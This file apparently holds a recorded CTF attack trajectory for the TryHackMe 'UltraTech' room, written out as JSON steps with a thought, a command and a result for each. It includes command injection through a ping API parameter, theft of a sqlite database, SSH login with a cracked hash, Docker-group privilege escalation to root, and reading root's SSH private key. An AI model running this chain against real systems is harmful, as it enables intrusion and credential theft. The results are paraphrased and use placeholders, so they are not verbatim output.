@@ -1,0 +1,95 @@
+{
+    "initial_prompt": "The goal is to exploit vulnerabilities in the target machine (IP: 10.10.213.191) to gain initial access, escalate privileges, and ultimately retrieve the root SSH private key. The attack machine is Kali 2024. This CTF is the 'UltraTech' TryHackMe room.",
+    "steps": [
+        {
+            "step_number": 1,
+            "thought": "Identify open ports and services on the target machine to understand potential entry points. This will reveal the attack surface.",
+            "command": "nmap -sC -sV -Pn -p- 10.10.213.191 -oN nmap_ultratech.txt",
+            "result": "The `nmap` scan completes and saves output to `nmap_ultratech.txt`. Key findings are:\n- Port 21 (FTP): vsftpd 3.0.3\n- Port 22 (SSH): OpenSSH 7.6p1 Ubuntu (protocol 2.0)\n- Port 8081 (HTTP): Node.js Express framework (API identified as UltraTech API v0.1.3 later)\n- Port 31331 (HTTP): Apache httpd 2.4.29 ((Ubuntu))\nOperating system guess: Linux (Ubuntu). The HTTP services on ports 8081 and 31331 are primary targets."
+        },
+        {
+            "step_number": 2,
+            "thought": "Investigate the HTTP service on port 8081 to identify its purpose.",
+            "command": "curl http://10.10.213.191:8081/",
+            "result": "The command returns the text: \"UltraTech API v0.1.3\". This confirms the service is an API, likely supporting a front-end application."
+        },
+        {
+            "step_number": 3,
+            "thought": "Explore the web application on port 31331 to gather more information and understand its functionality.",
+            "command": "curl http://10.10.213.191:31331/",
+            "result": "The command retrieves the HTML of the main page of a web application. Manual inspection of the site (or further `curl` commands for specific pages) would reveal a typical corporate website. A 'Contact Us' link with 'mailto:ultratech@yopmail.com' might suggest 'ultratech' as a potential username."
+        },
+        {
+            "step_number": 4,
+            "thought": "Enumerate hidden directories or API endpoints on the API service (port 8081) to find unlinked functionality.",
+            "command": "dirb http://10.10.213.191:8081/ /usr/share/dirb/wordlists/common.txt",
+            "result": "The `dirb` tool scans for common directories and files. The output reveals two notable endpoints:\n- `/auth` (HTTP 200)\n- `/ping` (HTTP 200)\nThese endpoints warrant further investigation."
+        },
+        {
+            "step_number": 5,
+            "thought": "Test the discovered `/ping` endpoint on port 8081 to understand its behavior.",
+            "command": "curl \"http://10.10.213.191:8081/ping\"",
+            "result": "The command returns an error message, likely HTML, containing text such as \"Handling Error\" or indicating a missing parameter. This suggests the endpoint expects input."
+        },
+        {
+            "step_number": 6,
+            "thought": "Test the `/ping` endpoint with a common parameter like 'ip' to see if it processes it.",
+            "command": "curl \"http://10.10.213.191:8081/ping?ip=127.0.0.1\"",
+            "result": "The command returns output consistent with a successful ping to `127.0.0.1` executed on the target server. This confirms the endpoint accepts an `ip` parameter and executes a system ping command, indicating a potential command injection vulnerability."
+        },
+        {
+            "step_number": 7,
+            "thought": "Attempt command injection via the `/ping` endpoint's `ip` parameter to list files in the API's current directory. This will confirm RCE and might reveal sensitive files.",
+            "command": "curl \"http://10.10.213.191:8081/ping?ip=`ls%20-la`\"",
+            "result": "The command injection is successful. The output, returned by `curl`, includes a directory listing from the target server's current directory for the API. This listing reveals the presence of a database file named 'utech.db.sqlite'."
+        },
+        {
+            "step_number": 8,
+            "thought": "Extract the contents of the discovered 'utech.db.sqlite' file using command injection to find potential credentials.",
+            "command": "curl \"http://10.10.213.191:8081/ping?ip=`cat%20utech.db.sqlite`\"",
+            "result": "The command injection successfully retrieves and displays the content of 'utech.db.sqlite'. The output contains SQL data, including a username 'r00t' and an associated password hash (e.g., 'HASH_VALUE_PLACEHOLDER'). As per the walkthrough, this hash is subsequently cracked (e.g., using an online decrypter or tools like John the Ripper/Hashcat with rockyou.txt) to obtain the plaintext password (e.g., 'password_from_hash')."
+        },
+        {
+            "step_number": 9,
+            "thought": "Use the extracted username 'r00t' and its cracked password to log into the target machine via SSH.",
+            "command": "ssh r00t@10.10.213.191",
+            "result": "The SSH connection prompts for a password. Upon entering the cracked password (e.g., 'password_from_hash'), authentication is successful, and access to a command-line shell as user 'r00t' on the target machine 10.10.213.191 is gained."
+        },
+        {
+            "step_number": 10,
+            "thought": "Verify the current user's identity and group memberships on the target machine to understand privilege levels.",
+            "command": "id",
+            "result": "The command output is: `uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)`. This confirms the user is 'r00t' (UID 1001, not root) and is a member of the 'docker' group, indicating a potential Docker-based privilege escalation vector."
+        },
+        {
+            "step_number": 11,
+            "thought": "Attempt privilege escalation using Docker by mounting the host's root filesystem into an Alpine container and chrooting into it. This is a common GTFOBins technique.",
+            "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+            "result": "The command fails. The error message indicates that the 'alpine' image cannot be found or there's an issue executing `chroot /mnt sh` within that environment, as suggested by the walkthrough."
+        },
+        {
+            "step_number": 12,
+            "thought": "Since the 'alpine' image failed, list available Docker images on the target system to find a suitable alternative for privilege escalation.",
+            "command": "docker images",
+            "result": "The command lists the Docker images available locally on the target machine. The output shows that an image named 'bash' (or similar, like a base OS image with bash) is present."
+        },
+        {
+            "step_number": 13,
+            "thought": "Attempt privilege escalation again using Docker, this time with the available 'bash' image, mounting the host's root filesystem.",
+            "command": "docker run -v /:/mnt --rm -it bash chroot /mnt sh",
+            "result": "The command executes successfully. A new shell prompt appears, indicating that the user is now inside a chroot environment with access to the host's entire filesystem. This strongly suggests successful privilege escalation."
+        },
+        {
+            "step_number": 14,
+            "thought": "Confirm that privilege escalation was successful by checking the current user's identity within the new shell.",
+            "command": "whoami",
+            "result": "The command output is: `root`. This confirms that the user now has root (UID 0) privileges on the target system."
+        },
+        {
+            "step_number": 15,
+            "thought": "Retrieve the root user's SSH private key from `/root/.ssh/id_rsa` to complete the final objective of the challenge.",
+            "command": "cat /root/.ssh/id_rsa",
+            "result": "The command displays the content of the root user's SSH private key (`/root/.ssh/id_rsa`) on the terminal. This includes the -----BEGIN RSA PRIVATE KEY----- and -----END RSA PRIVATE KEY----- markers and the key data itself."
+        }
+    ]
+}
